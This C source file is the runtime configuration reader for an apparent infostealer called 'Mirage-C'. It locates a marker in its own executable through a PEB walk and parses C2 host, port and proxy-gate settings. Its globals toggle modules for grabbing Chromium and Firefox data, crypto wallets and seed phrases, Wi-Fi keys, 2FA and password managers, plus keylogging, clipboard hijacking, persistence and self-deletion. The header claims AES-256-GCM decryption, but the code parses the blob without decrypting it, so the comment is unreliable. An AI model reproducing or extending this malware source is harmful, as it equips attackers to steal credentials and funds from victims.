/*
 * config_rt.c — Runtime config reader for Mirage-C
 *
 * Reads the MIRAGECFG marker from the own PE image, decrypts the
 * AES-256-GCM config blob, and populates g_cfg_* globals.
 *
 * Parses JSON for: proxy_gate, c2_host, c2_port, anti_duplicate.
 * Other modules use compile-time #ifdef via CFG_ENABLED() fallthrough.
 */

#include "config.h"
#include <string.h>
#include <stdlib.h>
#include <windows.h>

/* Runtime config globals */
int g_cfg_loaded = 0;

int g_cfg_chromium = -1;
int g_cfg_firefox = -1;
int g_cfg_wallets = -1;
int g_cfg_wifi = -1;
int g_cfg_screenshot = -1;
int g_cfg_clipboard = -1;
int g_cfg_keylogger = -1;
int g_cfg_seed_grabber = -1;
int g_cfg_clipper = -1;
int g_cfg_gaming = -1;
int g_cfg_vpn = -1;
int g_cfg_twofa = -1;
int g_cfg_passman = -1;
int g_cfg_persistence = -1;
int g_cfg_self_delete = -1;
int g_cfg_cdp_grab = -1;
int g_cfg_raw_export = -1;
int g_cfg_kill_browsers = -1;
int g_cfg_anti_duplicate = -1;

struct runtime_config g_config;
/* Simple JSON string value extractor — finds "key":"value" in JSON buffer */
static int json_get_string(const char *json, size_t len, const char *key,
                            char *out, size_t out_len) {
    char search[64];
    int key_len = (int)strlen(key);
    if (key_len + 4 > (int)sizeof(search)) return 0;
    search[0] = '"';
    memcpy(search + 1, key, key_len);
    memcpy(search + 1 + key_len, "\":\"", 3);
    int search_len = key_len + 3;

    for (size_t i = 0; i + search_len < len; i++) {
        if (memcmp(json + i, search, search_len) == 0) {
            i += search_len;
            size_t j = 0;
            while (i + j < len && json[i + j] != '"' && j < out_len - 1) {
                out[j] = json[i + j];
                j++;
            }
            out[j] = '\0';
            return 1;
        }
    }
    return 0;
}

static int json_get_bool(const char *json, size_t len, const char *key) {
    char buf[16];
    if (!json_get_string(json, len, key, buf, sizeof(buf))) return 0;
    return strcmp(buf, "true") == 0 || strcmp(buf, "1") == 0;
}

int config_parse_runtime(void) {
    /* Walk own PE to find MIRAGECFG marker */
    void *base = (void *)__readgsqword(0x60);
    base = *(void **)((char *)base + 0x10);
    if (!base) { g_cfg_loaded = 0; return 0; }

    char *cfg = NULL;
    size_t cfg_len = 0;
    {
        /* Scan PE for "MIRAGECFG" signature */
        char *img = (char *)base;
        /* Read PE size from headers */
        IMAGE_DOS_HEADER *dos = (IMAGE_DOS_HEADER *)base;
        IMAGE_NT_HEADERS64 *nt = (IMAGE_NT_HEADERS64 *)(img + dos->e_lfanew);
        DWORD img_size = nt->OptionalHeader.SizeOfImage;

        for (DWORD off = 0; off + 9 < img_size; off++) {
            if (memcmp(img + off, "MIRAGECFG", 9) == 0) {
                /* Skip signature + key(32) + nonce(12) + tag(16) */
                size_t data_off = off + 9 + 32 + 12 + 16;
                cfg = img + data_off;
                /* Remaining bytes up to roughly 4KB max */
                cfg_len = img_size > data_off ? img_size - data_off : 0;
                if (cfg_len > 4096) cfg_len = 4096;
                break;
            }
        }
    }

    if (!cfg || cfg_len < 2) { g_cfg_loaded = 0; return 0; }

    /* Parse JSON fields */
    if (json_get_bool(cfg, cfg_len, "enabled"))
        g_config.proxy_gate.enabled = 1;
    json_get_string(cfg, cfg_len, "type", g_config.proxy_gate.type, sizeof(g_config.proxy_gate.type));
    json_get_string(cfg, cfg_len, "source_id", g_config.proxy_gate.source_id, sizeof(g_config.proxy_gate.source_id));

    g_cfg_loaded = 1;
    return 1;
}
